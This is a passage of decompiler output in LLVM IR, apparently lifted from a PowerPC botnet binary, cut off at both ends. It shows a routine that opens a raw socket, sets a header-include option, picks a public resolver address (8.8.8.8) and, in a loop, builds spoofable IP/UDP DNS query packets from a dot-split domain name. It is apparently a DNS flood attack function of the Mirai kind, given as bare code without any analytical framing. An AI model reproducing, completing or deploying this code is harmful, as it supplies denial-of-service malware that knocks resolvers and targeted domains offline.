dec_label_pc_10005368:                            ; preds = %dec_label_pc_10005360
  %v2_10005368 = sub i32 %v0_10005360, %v0_10005358
  store i32 %v2_10005368, i32* %r0.global-to-local, align 4
  store i32 %v0_10005358, i32* %r10.global-to-local, align 4
  store i32 %v2_10005368, i32* %ctr.global-to-local, align 4
  %v0_10005374 = load i32, i32* %r27.global-to-local, align 4
  %v2_10005374 = add i32 %v0_10005374, %v0_10005358
  store i32 %v2_10005374, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v1_1000537c = add i32 %v0_10005360, -1
  store i32 %v1_1000537c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10005380

dec_label_pc_10005380:                            ; preds = %dec_label_pc_100053c8, %dec_label_pc_10005368
  %v0_100053cc = phi i32 [ %v1_100053cc, %dec_label_pc_100053c8 ], [ %v2_10005368, %dec_label_pc_10005368 ]
  %v0_100053c8 = phi i32 [ %v1_100053c8, %dec_label_pc_100053c8 ], [ %v0_10005358, %dec_label_pc_10005368 ]
  %v0_10005384 = phi i32 [ %v0_100053845, %dec_label_pc_100053c8 ], [ 0, %dec_label_pc_10005368 ]
  %v0_10005394 = phi i32 [ %v1_10005394, %dec_label_pc_100053c8 ], [ %v2_10005374, %dec_label_pc_10005368 ]
  %v1_10005380 = inttoptr i32 %v0_10005394 to i8*
  %v2_10005380 = load i8, i8* %v1_10005380, align 1
  %v3_10005380 = zext i8 %v2_10005380 to i32
  store i32 %v3_10005380, i32* %r9.global-to-local, align 4
  %v3_10005384 = icmp eq i32 %v0_10005384, 0
  store i1 %v3_10005384, i1* %cr7_eq.global-to-local, align 1
  %v2_1000538c = icmp slt i32 %v1_1000537c, %v0_100053c8
  %v4_1000538c = icmp eq i32 %v1_1000537c, %v0_100053c8
  store i1 %v2_1000538c, i1* %cr4_lt.global-to-local, align 1
  store i1 %v4_1000538c, i1* %cr4_eq.global-to-local, align 1
  %v1_10005390 = add nuw nsw i32 %v3_10005380, 208
  %v1_10005394 = add i32 %v0_10005394, 1
  store i32 %v1_10005394, i32* %r11.global-to-local, align 4
  %v1_10005398 = urem i32 %v1_10005390, 256
  store i32 %v1_10005398, i32* %r0.global-to-local, align 4
  %v3_1000539c = icmp eq i8 %v2_10005380, 46
  br i1 %v3_10005384, label %dec_label_pc_100053ac, label %dec_label_pc_100053bc

dec_label_pc_100053ac:                            ; preds = %dec_label_pc_10005380
  %v3_100053ac = icmp eq i8 %v2_10005380, 9
  store i1 %v3_100053ac, i1* %cr7_eq.global-to-local, align 1
  switch i8 %v2_10005380, label %dec_label_pc_100053b8 [
    i8 32, label %dec_label_pc_100053c8
    i8 9, label %dec_label_pc_100053c8
  ]

dec_label_pc_100053b8:                            ; preds = %dec_label_pc_100053ac
  store i32 1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100053bc

dec_label_pc_100053bc:                            ; preds = %dec_label_pc_10005380, %dec_label_pc_100053b8
  %v0_100053846 = phi i32 [ %v0_10005384, %dec_label_pc_10005380 ], [ 1, %dec_label_pc_100053b8 ]
  %v2_100053a0.not = icmp ult i32 %v1_10005398, 10
  %brmerge = or i1 %v3_1000539c, %v2_100053a0.not
  br i1 %brmerge, label %dec_label_pc_100053c4, label %dec_label_pc_100057d0

dec_label_pc_100053c4:                            ; preds = %dec_label_pc_100053bc
  br i1 %v4_1000538c, label %dec_label_pc_100057d4, label %dec_label_pc_100053c8

dec_label_pc_100053c8:                            ; preds = %dec_label_pc_100053ac, %dec_label_pc_100053ac, %dec_label_pc_100053c4
  %v0_100053845 = phi i32 [ 0, %dec_label_pc_100053ac ], [ %v0_100053846, %dec_label_pc_100053c4 ], [ 0, %dec_label_pc_100053ac ]
  %v1_100053c8 = add i32 %v0_100053c8, 1
  store i32 %v1_100053c8, i32* %r10.global-to-local, align 4
  %v1_100053cc = add i32 %v0_100053cc, -1
  store i32 %v1_100053cc, i32* %ctr.global-to-local, align 4
  %v2_100053cc = icmp eq i32 %v1_100053cc, 0
  br i1 %v2_100053cc, label %dec_label_pc_100053d0, label %dec_label_pc_10005380

dec_label_pc_100053d0:                            ; preds = %dec_label_pc_100053c8, %dec_label_pc_10005360, %dec_label_pc_10005308, %entry
  %v0_100053d0 = call i32 @rand_next()
  %v1_100053d4 = urem i32 %v0_100053d0, 4
  store i32 %v1_100053d4, i32* %r3.global-to-local, align 4
  %v3_100053d8 = icmp eq i32 %v1_100053d4, 1
  store i1 %v3_100053d8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100053d8, label %dec_label_pc_10005824, label %dec_label_pc_100053e0

dec_label_pc_100053e0:                            ; preds = %dec_label_pc_100053d0
  %v1_100053d8 = icmp eq i32 %v1_100053d4, 0
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_100053d8, label %dec_label_pc_100053e8, label %dec_label_pc_10005808

dec_label_pc_100053e8:                            ; preds = %dec_label_pc_100053e0
  store i32 134744072, i32* @r22, align 4
  br label %dec_label_pc_100053f0

dec_label_pc_100053f0:                            ; preds = %dec_label_pc_10005810, %dec_label_pc_10005830, %dec_label_pc_10005824, %dec_label_pc_10005818, %dec_label_pc_100057d4, %dec_label_pc_100053e8
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_100053f4 = call i32 @__GI_time()
  %v0_100053f8 = load i32, i32* @r26, align 4
  %v3_100053f8 = icmp eq i32 %v0_100053f8, 0
  store i1 %v3_100053f8, i1* %cr7_eq.global-to-local, align 1
  %v1_100053fc = load i32, i32* @r23, align 4
  %v2_100053fc = add i32 %v1_100053fc, %v0_100053f4
  store i32 %v2_100053fc, i32* %r3.global-to-local, align 4
  br i1 %v3_100053f8, label %dec_label_pc_100056fc, label %dec_label_pc_10005408

dec_label_pc_10005408:                            ; preds = %dec_label_pc_100053f0
  store i32 %v0_100053f8, i32* %r3.global-to-local, align 4
  store i32 268456976, i32* @lr, align 4
  %v1_1000540c = inttoptr i32 %v0_100053f8 to i8*
  %v2_1000540c = call i32 @util_strlen(i8* %v1_1000540c)
  store i32 %v2_1000540c, i32* @r29, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268456996, i32* @lr, align 4
  %v3_10005420 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_10005420, i32* %r3.global-to-local, align 4
  %v3_10005424 = icmp eq i32 %v3_10005420, -1
  store i1 %v3_10005424, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_10005420, i32* @r23, align 4
  br i1 %v3_10005424, label %dec_label_pc_100056fc, label %dec_label_pc_10005430

dec_label_pc_10005430:                            ; preds = %dec_label_pc_10005408
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_1000543c = ptrtoint i32* %stack_var_-2200 to i32
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-2200, align 4
  store i32 268457036, i32* @lr, align 4
  %v5_10005448 = call i32 @__GI_setsockopt(i32 0, i32 3, i32 %v2_1000543c, i32 4, i32 4)
  store i32 %v5_10005448, i32* %r3.global-to-local, align 4
  %v3_1000544c = icmp eq i32 %v5_10005448, -1
  store i1 %v3_1000544c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000544c, label %dec_label_pc_1000583c, label %dec_label_pc_10005454

dec_label_pc_10005454:                            ; preds = %dec_label_pc_10005430
  %v0_10005454 = load i32, i32* %r20.global-to-local, align 4
  %v3_10005454 = icmp eq i32 %v0_10005454, 0
  store i1 %v3_10005454, i1* %cr7_eq.global-to-local, align 1
  %v0_10005458 = load i32, i32* %r16.global-to-local, align 4
  %v1_10005458 = urem i32 %v0_10005458, 65536
  store i32 %v1_10005458, i32* %r15.global-to-local, align 4
  %v0_1000545c = load i32, i32* %r25.global-to-local, align 4
  %v1_1000545c = urem i32 %v0_1000545c, 256
  store i32 %v1_1000545c, i32* @r27, align 4
  %v0_10005460 = load i32, i32* %r17.global-to-local, align 4
  %v1_10005460 = urem i32 %v0_10005460, 65536
  store i32 %v1_10005460, i32* %r16.global-to-local, align 4
  %v0_10005464 = call i32 @__asm_mfcr()
  store i32 %v0_10005464, i32* %r3.global-to-local, align 4
  %v0_1000546c = load i32, i32* %r18.global-to-local, align 4
  %v1_1000546c = urem i32 %v0_1000546c, 65536
  store i32 %v1_1000546c, i32* %r17.global-to-local, align 4
  %v0_10005470 = load i32, i32* %r24.global-to-local, align 4
  %v1_10005470 = urem i32 %v0_10005470, 65536
  store i32 %v1_10005470, i32* %r18.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-2200, align 4
  %v0_10005480 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10005480, label %dec_label_pc_100055e4, label %dec_label_pc_10005484

dec_label_pc_10005484:                            ; preds = %dec_label_pc_10005454
  %v0_10005484 = load i32, i32* @r29, align 4
  %v1_10005484 = load i32, i32* @r27, align 4
  %v2_10005484 = add i32 %v1_10005484, %v0_10005484
  %v1_10005488 = icmp slt i32 %v0_10005484, 0
  %v3_10005488 = icmp eq i32 %v0_10005484, 0
  store i1 %v1_10005488, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_10005488, i1* %cr4_eq.global-to-local, align 1
  %v1_1000548c = urem i32 %v2_10005484, 65536
  %v0_10005490 = load i32, i32* %r14.global-to-local, align 4
  %v3_10005490 = icmp eq i32 %v0_10005490, 0
  store i1 %v3_10005490, i1* %cr3_eq.global-to-local, align 1
  %v1_10005494 = add nuw nsw i32 %v1_1000548c, 27
  store i32 %v1_10005494, i32* %r0.global-to-local, align 4
  %v1_10005498 = add nuw nsw i32 %v1_1000548c, 47
  store i32 %v1_10005498, i32* %r9.global-to-local, align 4
  %fold = add i32 %v2_10005484, 47
  %v1_1000549c = urem i32 %fold, 65536
  store i32 %v1_1000549c, i32* @r25, align 4
  %fold3 = add i32 %v2_10005484, 27
  %v1_100054a0 = urem i32 %fold3, 65536
  store i32 %v1_100054a0, i32* @r28, align 4
  %v1_100054a4 = add i32 %v0_10005484, 1
  store i32 %v1_100054a4, i32* @r24, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  store i32 268566528, i32* %r14.global-to-local, align 4
  %v4_10005500 = sext i8 %v5_10005240 to i32
  br label %dec_label_pc_100054b0

dec_label_pc_100054b0:                            ; preds = %dec_label_pc_1000579c, %dec_label_pc_100055bc, %dec_label_pc_10005484
  store i32 600, i32* %r3.global-to-local, align 4
  store i32 268457148, i32* @lr, align 4
  %v2_100054b8 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_100054b8, i32* %r3.global-to-local, align 4
  %v3_100054bc = load i32, i32* %stack_var_-2200, align 4
  store i32 %v3_100054bc, i32* %r0.global-to-local, align 4
  %v0_100054c0 = load i32, i32* @r31, align 4
  %v1_100054c0 = mul i32 %v0_100054c0, 4
  store i32 %v1_100054c0, i32* %r9.global-to-local, align 4
  %v2_100054c4 = load i32, i32* @r21, align 4
  %v3_100054c4 = add i32 %v2_100054c4, %v1_100054c0
  %v4_100054c4 = inttoptr i32 %v3_100054c4 to i32*
  store i32 %v2_100054b8, i32* %v4_100054c4, align 4
  %v0_100054c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100054c8 = mul i32 %v0_100054c8, 4
  store i32 %v1_100054c8, i32* %r0.global-to-local, align 4
  %v0_100054cc = load i32, i32* @r21, align 4
  %v2_100054cc = add i32 %v0_100054cc, %v1_100054c8
  %v3_100054cc = inttoptr i32 %v2_100054cc to i32*
  %v4_100054cc = load i32, i32* %v3_100054cc, align 4
  store i32 %v4_100054cc, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_100054d4 = inttoptr i32 %v4_100054cc to i32*
  %v2_100054d4 = load i32, i32* %v1_100054d4, align 4
  store i32 %v2_100054d4, i32* %r9.global-to-local, align 4
  %v1_100054d8 = add i32 %v4_100054cc, 20
  store i32 %v1_100054d8, i32* %r11.global-to-local, align 4
  %v0_100054dc = load i32, i32* %r15.global-to-local, align 4
  %v1_100054dc = trunc i32 %v0_100054dc to i16
  %v3_100054dc = add i32 %v4_100054cc, 4
  %v4_100054dc = inttoptr i32 %v3_100054dc to i16*
  store i16 %v1_100054dc, i16* %v4_100054dc, align 2
  %v0_100054e0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100054e0 = add i32 %v0_100054e0, 28
  store i32 %v1_100054e0, i32* %r8.global-to-local, align 4
  %v1_100054e4 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_100054e4, i32* %r9.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_100054ec = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_100054ec, i32* %r9.global-to-local, align 4
  %v1_100054f0 = load i32, i32* %r10.global-to-local, align 4
  %v2_100054f0 = inttoptr i32 %v1_100054f0 to i32*
  store i32 %v1_100054ec, i32* %v2_100054f0, align 4
  %v0_100054f4 = load i32, i32* @r25, align 4
  %v1_100054f4 = trunc i32 %v0_100054f4 to i16
  %v2_100054f4 = load i32, i32* %r10.global-to-local, align 4
  %v3_100054f4 = add i32 %v2_100054f4, 2
  %v4_100054f4 = inttoptr i32 %v3_100054f4 to i16*
  store i16 %v1_100054f4, i16* %v4_100054f4, align 2
  %v2_100054fc = load i32, i32* %r10.global-to-local, align 4
  %v3_100054fc = add i32 %v2_100054fc, 1
  %v4_100054fc = inttoptr i32 %v3_100054fc to i8*
  store i8 %v5_10005208, i8* %v4_100054fc, align 1
  store i32 %v4_10005500, i32* %r0.global-to-local, align 4
  %v2_10005504 = load i32, i32* %r10.global-to-local, align 4
  %v3_10005504 = add i32 %v2_10005504, 8
  %v4_10005504 = inttoptr i32 %v3_10005504 to i8*
  store i8 %v5_10005240, i8* %v4_10005504, align 1
  %v0_10005508 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10005508, label %dec_label_pc_10005514, label %dec_label_pc_1000550c

dec_label_pc_1000550c:                            ; preds = %dec_label_pc_100054b0
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_10005510 = load i32, i32* %r10.global-to-local, align 4
  %v3_10005510 = add i32 %v2_10005510, 6
  %v4_10005510 = inttoptr i32 %v3_10005510 to i16*
  store i16 16384, i16* %v4_10005510, align 2
  br label %dec_label_pc_10005514

dec_label_pc_10005514:                            ; preds = %dec_label_pc_100054b0, %dec_label_pc_1000550c
  %v0_10005518 = load i32, i32* %r10.global-to-local, align 4
  %v1_10005518 = add i32 %v0_10005518, 41
  store i32 %v1_10005518, i32* %r9.global-to-local, align 4
  %v3_1000551c = add i32 %v0_10005518, 9
  %v4_1000551c = inttoptr i32 %v3_1000551c to i8*
  store i8 17, i8* %v4_1000551c, align 1
  %v0_10005520 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005520 = load i32, i32* @r27, align 4
  %v2_10005520 = add i32 %v1_10005520, %v0_10005520
  store i32 %v2_10005520, i32* %r30.global-to-local, align 4
  store i32 256, i32* %r9.global-to-local, align 4
  %v0_10005528 = load i32, i32* @r28, align 4
  %v1_10005528 = trunc i32 %v0_10005528 to i16
  %v2_10005528 = load i32, i32* %r11.global-to-local, align 4
  %v3_10005528 = add i32 %v2_10005528, 4
  %v4_10005528 = inttoptr i32 %v3_10005528 to i16*
  store i16 %v1_10005528, i16* %v4_10005528, align 2
  %v3_1000552c = load i32, i32* @global_var_100211e0.76, align 4
  store i32 %v3_1000552c, i32* %r0.global-to-local, align 4
  %v0_10005530 = load i32, i32* %r30.global-to-local, align 4
  %v1_10005530 = add i32 %v0_10005530, 1
  store i32 %v1_10005530, i32* %r31.global-to-local, align 4
  %v0_10005534 = load i32, i32* %r17.global-to-local, align 4
  %v1_10005534 = trunc i32 %v0_10005534 to i16
  %v2_10005534 = load i32, i32* %r11.global-to-local, align 4
  %v3_10005534 = add i32 %v2_10005534, 2
  %v4_10005534 = inttoptr i32 %v3_10005534 to i16*
  store i16 %v1_10005534, i16* %v4_10005534, align 2
  %v0_10005538 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10005538, i32* %r3.global-to-local, align 4
  %v0_1000553c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000553c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000553c = add i32 %v1_1000553c, 12
  %v3_1000553c = inttoptr i32 %v2_1000553c to i32*
  store i32 %v0_1000553c, i32* %v3_1000553c, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10005544 = load i32, i32* %r16.global-to-local, align 4
  %v1_10005544 = trunc i32 %v0_10005544 to i16
  %v2_10005544 = load i32, i32* %r10.global-to-local, align 4
  %v3_10005544 = add i32 %v2_10005544, 20
  %v4_10005544 = inttoptr i32 %v3_10005544 to i16*
  store i16 %v1_10005544, i16* %v4_10005544, align 2
  %v0_10005548 = load i32, i32* @r26, align 4
  %v0_1000554c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000554c = trunc i32 %v0_1000554c to i16
  %v2_1000554c = load i32, i32* %r8.global-to-local, align 4
  %v3_1000554c = add i32 %v2_1000554c, 4
  %v4_1000554c = inttoptr i32 %v3_1000554c to i16*
  store i16 %v1_1000554c, i16* %v4_1000554c, align 2
  %v0_10005550 = load i32, i32* @r24, align 4
  %v0_10005554 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005554 = trunc i32 %v0_10005554 to i16
  %v2_10005554 = load i32, i32* %r8.global-to-local, align 4
  %v3_10005554 = add i32 %v2_10005554, 2
  %v4_10005554 = inttoptr i32 %v3_10005554 to i16*
  store i16 %v1_10005554, i16* %v4_10005554, align 2
  %v0_10005558 = load i32, i32* @r22, align 4
  %v1_10005558 = load i32, i32* %r10.global-to-local, align 4
  %v2_10005558 = add i32 %v1_10005558, 16
  %v3_10005558 = inttoptr i32 %v2_10005558 to i32*
  store i32 %v0_10005558, i32* %v3_10005558, align 4
  %v0_1000555c = load i32, i32* %r18.global-to-local, align 4
  %v1_1000555c = trunc i32 %v0_1000555c to i16
  %v2_1000555c = load i32, i32* %r10.global-to-local, align 4
  %v3_1000555c = add i32 %v2_1000555c, 28
  %v4_1000555c = inttoptr i32 %v3_1000555c to i16*
  store i16 %v1_1000555c, i16* %v4_1000555c, align 2
  %v0_10005560 = load i32, i32* @r27, align 4
  %v1_10005560 = trunc i32 %v0_10005560 to i8
  %v2_10005560 = load i32, i32* %r10.global-to-local, align 4
  %v3_10005560 = add i32 %v2_10005560, 40
  %v4_10005560 = inttoptr i32 %v3_10005560 to i8*
  store i8 %v1_10005560, i8* %v4_10005560, align 1
  store i32 268457320, i32* @lr, align 4
  %v3_10005564 = call i32 @util_memcpy(i32 %v0_10005538, i32 %v0_10005548, i32 %v0_10005550)
  store i32 %v3_10005564, i32* %r3.global-to-local, align 4
  %v0_10005568 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10005568 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10005568 = or i1 %v0_10005568, %v1_10005568
  br i1 %v2_10005568, label %dec_label_pc_1000579c, label %dec_label_pc_1000556c

dec_label_pc_1000556c:                            ; preds = %dec_label_pc_10005514
  %v0_1000556c = load i32, i32* @r29, align 4
  store i32 %v0_1000556c, i32* %ctr.global-to-local, align 4
  %v0_10005570 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10005570, i32* %r3.global-to-local, align 4
  %v0_10005574 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10005574, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10005594.outer

dec_label_pc_10005594.outer:                      ; preds = %dec_label_pc_100055a4, %dec_label_pc_1000556c
  %v2_100055a4.ph = phi i32 [ %v0_100055ac, %dec_label_pc_100055a4 ], [ %v0_10005574, %dec_label_pc_1000556c ]
  %v0_10005590.ph = phi i32 [ %v1_100055b8, %dec_label_pc_100055a4 ], [ %v0_1000556c, %dec_label_pc_1000556c ]
  %v0_1000558c.ph = phi i32 [ %v1_100055b4, %dec_label_pc_100055a4 ], [ %v0_10005570, %dec_label_pc_1000556c ]
  %v0_10005588.ph = phi i32 [ %v1_100055a8, %dec_label_pc_100055a4 ], [ 0, %dec_label_pc_1000556c ]
  %v1_10005594.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_10005594

dec_label_pc_10005584:                            ; preds = %dec_label_pc_10005594
  %v1_10005584 = urem i32 %v1_10005598, 256
  store i32 %v1_10005584, i32* %r8.global-to-local, align 4
  %v1_10005588 = add i32 %v0_10005588, 1
  store i32 %v1_10005588, i32* %r11.global-to-local, align 4
  %v1_1000558c = add i32 %v0_1000558c, 1
  store i32 %v1_1000558c, i32* %r3.global-to-local, align 4
  %v1_10005590 = add i32 %v0_10005590, -1
  store i32 %v1_10005590, i32* %ctr.global-to-local, align 4
  %v2_10005590 = icmp eq i32 %v1_10005590, 0
  br i1 %v2_10005590, label %dec_label_pc_100055bc.loopexit, label %dec_label_pc_10005594

dec_label_pc_10005594:                            ; preds = %dec_label_pc_10005594.outer, %dec_label_pc_10005584
  %v0_10005590 = phi i32 [ %v1_10005590, %dec_label_pc_10005584 ], [ %v0_10005590.ph, %dec_label_pc_10005594.outer ]
  %v0_1000558c = phi i32 [ %v1_1000558c, %dec_label_pc_10005584 ], [ %v0_1000558c.ph, %dec_label_pc_10005594.outer ]
  %v0_100055a4 = phi i32 [ %v1_10005584, %dec_label_pc_10005584 ], [ 0, %dec_label_pc_10005594.outer ]
  %v0_10005588 = phi i32 [ %v1_10005588, %dec_label_pc_10005584 ], [ %v0_10005588.ph, %dec_label_pc_10005594.outer ]
  %v2_10005594 = add i32 %v1_10005594.pre, %v0_10005588
  %v3_10005594 = inttoptr i32 %v2_10005594 to i8*
  %v4_10005594 = load i8, i8* %v3_10005594, align 1
  %v5_10005594 = zext i8 %v4_10005594 to i32
  store i32 %v5_10005594, i32* %r0.global-to-local, align 4
  %v1_10005598 = add nuw nsw i32 %v0_100055a4, 1
  store i32 %v1_10005598, i32* %r9.global-to-local, align 4
  %v3_1000559c = icmp eq i8 %v4_10005594, 46
  store i1 %v3_1000559c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000559c, label %dec_label_pc_100055a4, label %dec_label_pc_10005584

dec_label_pc_100055a4:                            ; preds = %dec_label_pc_10005594
  %v1_100055a4 = trunc i32 %v0_100055a4 to i8
  %v3_100055a4 = inttoptr i32 %v2_100055a4.ph to i8*
  store i8 %v1_100055a4, i8* %v3_100055a4, align 1
  %v0_100055a8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100055a8 = add i32 %v0_100055a8, 1
  store i32 %v1_100055a8, i32* %r11.global-to-local, align 4
  %v0_100055ac = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_100055ac, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v1_100055b4 = add i32 %v0_100055ac, 1
  store i32 %v1_100055b4, i32* %r3.global-to-local, align 4
  %v0_100055b8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100055b8 = add i32 %v0_100055b8, -1
  store i32 %v1_100055b8, i32* %ctr.global-to-local, align 4
  %v2_100055b8 = icmp eq i32 %v1_100055b8, 0
  br i1 %v2_100055b8, label %dec_label_pc_100055bc, label %dec_label_pc_10005594.outer

dec_label_pc_100055bc.loopexit:                   ; preds = %dec_label_pc_10005584
  %extract.t.le = trunc i32 %v1_10005598 to i8
  br label %dec_label_pc_100055bc

dec_label_pc_100055bc:                            ; preds = %dec_label_pc_100055a4, %dec_label_pc_100055bc.loopexit
  %v2_100055bc = phi i32 [ %v2_100055a4.ph, %dec_label_pc_100055bc.loopexit ], [ %v0_100055ac, %dec_label_pc_100055a4 ]
  %v0_100055bc.off0 = phi i8 [ %extract.t.le, %dec_label_pc_100055bc.loopexit ], [ 0, %dec_label_pc_100055a4 ]
  %v3_100055bc = inttoptr i32 %v2_100055bc to i8*
  store i8 %v0_100055bc.off0, i8* %v3_100055bc, align 1
  %v0_100055c0 = load i32, i32* %r30.global-to-local, align 4
  %v1_100055c0 = load i32, i32* @r29, align 4
  %v2_100055c0 = add i32 %v1_100055c0, %v0_100055c0
  store i32 %v2_100055c0, i32* %r11.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_100055c8 = load i32, i32* %stack_var_-2200, align 4
  store i32 %v3_100055c8, i32* %r9.global-to-local, align 4
  %v3_100055cc = add i32 %v2_100055c0, 4
  %v4_100055cc = inttoptr i32 %v3_100055cc to i16*
  store i16 1, i16* %v4_100055cc, align 2
  %v0_100055d0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100055d0 = add i32 %v0_100055d0, 1
  store i32 %v1_100055d0, i32* %r31.global-to-local, align 4
  %v0_100055d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100055d4 = trunc i32 %v0_100055d4 to i16
  %v2_100055d4 = load i32, i32* %r11.global-to-local, align 4
  %v3_100055d4 = add i32 %v2_100055d4, 2
  %v4_100055d4 = inttoptr i32 %v3_100055d4 to i16*
  store i16 %v1_100055d4, i16* %v4_100055d4, align 2
  %v0_100055d8 = load i32, i32* %r31.global-to-local, align 4
  %v1_100055d8 = load i32, i32* %r20.global-to-local, align 4
  %v2_100055d8 = icmp slt i32 %v0_100055d8, %v1_100055d8
  %v4_100055d8 = icmp eq i32 %v0_100055d8, %v1_100055d8
  store i1 %v4_100055d8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_100055d8, i32* %stack_var_-2200, align 4
  br i1 %v2_100055d8, label %dec_label_pc_100054b0, label %dec_label_pc_100055e4.loopexit

dec_label_pc_100055e4.loopexit:                   ; preds = %dec_label_pc_100055bc, %dec_label_pc_1000579c
  %v0_100055f4.pre = load i32, i32* %r18.global-to-local, align 4
  %v0_10005600.pre = load i32, i32* %r17.global-to-local, align 4
  br label %dec_label_pc_100055e4

dec_label_pc_100055e4:                            ; preds = %dec_label_pc_100055e4.loopexit, %dec_label_pc_10005454
  %v0_10005600 = phi i32 [ %v0_10005600.pre, %dec_label_pc_100055e4.loopexit ], [ %v1_1000546c, %dec_label_pc_10005454 ]
  %v0_100055f4 = phi i32 [ %v0_100055f4.pre, %dec_label_pc_100055e4.loopexit ], [ %v1_10005470, %dec_label_pc_10005454 ]
  %v0_100055e8 = load i32, i32* @r29, align 4
  %v1_100055e8 = load i32, i32* @r27, align 4
  %v2_100055e8 = add i32 %v1_100055e8, %v0_100055e8
  store i32 %v2_100055e8, i32* %r9.global-to-local, align 4
  store i32 65535, i32* %r0.global-to-local, align 4
  %v1_100055f0 = add i32 %v2_100055e8, 47
  store i32 %v1_100055f0, i32* @r25, align 4
  %v4_100055f4 = icmp eq i32 %v0_100055f4, 65535
  store i1 %v4_100055f4, i1* %cr7_eq.global-to-local, align 1
  %v0_100055f8 = load i32, i32* %r15.global-to-local, align 4
  %v4_100055f8 = icmp eq i32 %v0_100055f8, 65535
  store i1 %v4_100055f8, i1* %cr2_eq.global-to-local, align 1
  %v0_100055fc = load i32, i32* %r16.global-to-local, align 4
  %v4_100055fc = icmp eq i32 %v0_100055fc, 65535
  store i1 %v4_100055fc, i1* %cr3_eq.global-to-local, align 1
  %v2_10005600 = icmp slt i32 %v0_10005600, 65535
  %v4_10005600 = icmp eq i32 %v0_10005600, 65535
  store i1 %v2_10005600, i1* %cr4_lt.global-to-local, align 1
  store i1 %v4_10005600, i1* %cr4_eq.global-to-local, align 1
  %v0_10005604 = call i32 @__asm_mfcr()
  store i32 %v0_10005604, i32* %r3.global-to-local, align 4
  %v1_10005608 = mul i32 %v0_10005604, 268435456
  store i32 %v1_10005608, i32* @r24, align 4
  %v0_1000560c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000560c = add i32 %v0_1000560c, 27
  store i32 %v1_1000560c, i32* @r26, align 4
  %v2_1000561c = urem i32 %v0_10005464, 16
  %v1_10005624 = mul nuw i32 %v2_1000561c, 268435456
  br label %dec_label_pc_10005610

dec_label_pc_10005610:                            ; preds = %dec_label_pc_100056e8, %dec_label_pc_100055e4
  store i32 0, i32* %stack_var_-2200, align 4
  store i32 %v2_1000561c, i32* %r0.global-to-local, align 4
  %v1_10005620 = call %0 @__asm_mtcrf(i32 1, i32 %v2_1000561c)
  store i32 %v1_10005624, i32* %r0.global-to-local, align 4
  %v0_10005628 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10005628, label %dec_label_pc_100056e8, label %dec_label_pc_1000562c

dec_label_pc_1000562c:                            ; preds = %dec_label_pc_10005610
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10005630

dec_label_pc_10005630:                            ; preds = %dec_label_pc_10005660, %dec_label_pc_1000562c
  %v0_10005630 = phi i32 [ %v1_100056d8, %dec_label_pc_10005660 ], [ 0, %dec_label_pc_1000562c ]
  %v1_10005630 = mul i32 %v0_10005630, 4
  store i32 %v1_10005630, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v0_10005638 = load i32, i32* @r21, align 4
  %v2_10005638 = add i32 %v0_10005638, %v1_10005630
  %v3_10005638 = inttoptr i32 %v2_10005638 to i32*
  %v4_10005638 = load i32, i32* %v3_10005638, align 4
  store i32 %v4_10005638, i32* @r29, align 4
  %v1_1000563c = add i32 %v4_10005638, 20
  store i32 %v1_1000563c, i32* @r28, align 4
  %v1_10005640 = add i32 %v4_10005638, 41
  store i32 %v1_10005640, i32* @r31, align 4
  %v0_10005644 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10005644, label %dec_label_pc_1000578c, label %dec_label_pc_10005648

dec_label_pc_10005648:                            ; preds = %dec_label_pc_10005630
